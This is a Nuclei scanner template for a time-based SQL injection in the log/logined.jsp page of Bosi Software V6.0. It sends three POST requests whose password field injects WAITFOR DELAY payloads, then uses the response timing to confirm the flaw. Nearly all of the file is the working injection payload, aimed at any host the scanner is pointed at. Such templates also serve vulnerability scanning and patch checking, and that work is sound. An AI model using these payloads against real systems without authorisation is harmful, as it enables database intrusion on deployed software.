id: bosi-logined-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 福建博思软件股份有限公司博斯软件V6.0 log/logined.jsp存在SQL注入漏洞。
  reference:
    - http://kpanda.wiki/#/Vulnhub/B3-1%E5%8D%9A%E6%96%AF%E8%BD%AF%E4%BB%B6-V6.0-SQL?id=b3-1%e5%8d%9a%e6%96%af%e8%bd%af%e4%bb%b6-v60-sql
  tags: tags
http:
  - raw:
      - |-
        POST /log/logined.jsp HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Cookie: JSESSIONID=80D835813F9733E867790648CBAA0EC6
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip,deflate
        Content-Length: 58
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
        Host: {{Hostname}}
        Connection: Keep-alive

        Submit=-1A&account=-1password=g-1';WAITFOR DELAY '0:0:3'--
      - |-
        POST /log/logined.jsp HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Cookie: JSESSIONID=80D835813F9733E867790648CBAA0EC6
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip,deflate
        Content-Length: 58
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
        Host: {{Hostname}}
        Connection: Keep-alive

        Submit=-1A&account=-1password=g-1';WAITFOR DELAY '0:0:6'--
      - |-
        POST /log/logined.jsp HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Cookie: JSESSIONID=80D835813F9733E867790648CBAA0EC6
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip,deflate
        Content-Length: 58
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
        Host: {{Hostname}}
        Connection: Keep-alive

        Submit=-1A&account=-1password=g-1';WAITFOR DELAY '0:0:9'--
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"